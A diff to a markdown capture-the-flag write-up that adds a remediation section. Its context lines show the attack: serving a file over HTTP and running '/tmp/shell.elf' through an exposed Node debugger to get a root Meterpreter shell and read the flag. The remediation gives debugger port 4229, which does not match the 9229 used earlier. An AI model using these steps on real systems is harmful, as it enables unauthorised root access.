@@ -77,7 +77,7 @@ Content-Disposition: form-data; name="1"
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
-<h2>Gaining Access/Exploitation</h2>
+## Gaining Access/Exploitation
 
 ```
 python3 -m http.server 80
@@ -204,10 +204,15 @@ node inspect localhost:9229
 debug> exec("process.mainModule.require('child_process').exec('/tmp/shell.elf')")
 ```
 
-This opens a Meterpreter shell as root. Now we just grab the root flag and sit back. 
+This opens a Meterpreter shell as root. Now we just grab the root flag. 
 
 ```
 whoami
 root
 cat /root/flag.txt
 ```
+
+## Remediation
+
+* Upgrade React to latest version to patch React2Shell vulnerability. 
+* Kill the node inspect on port 4229 and instead run it as a low priv user instead of root. 
